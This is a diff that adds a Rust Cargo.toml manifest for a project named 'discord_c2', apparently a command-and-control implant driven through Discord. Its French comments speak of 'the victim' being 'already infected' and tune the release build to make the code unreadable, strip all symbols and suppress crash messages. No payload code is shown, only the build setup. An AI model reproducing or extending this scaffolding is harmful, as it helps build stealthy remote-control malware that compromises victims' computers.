@@ -1,0 +1,17 @@
+[package]
+name = "discord_c2"
+version = "0.1.0"
+edition = "2024"
+
+[dependencies]
+serenity = { version = "0.12", default-features = false, features = ["client", "gateway", "rustls_backend", "model"] }
+tokio = { version = "1", features = ["macros", "rt-multi-thread", "process", "time"] }
+whoami = "1.4"
+single-instance = "0.3" # se sucide si la victime est deja infecté (corrige le problème de duplication)
+
+[profile.release]
+opt-level = "z"     # Optimise pour la taille (Size) plutôt que la vitesse pure
+lto = true          # Link Time Optimization (fusionne le code pour le rendre illisible)
+codegen-units = 1   # Compile plus lentement mais rend le code plus compact
+panic = "abort"     # Si ça plante, ça coupe net (pas de message d'erreur)
+strip = true        # Retire TOUS les symboles (noms de fonctions, etc.)
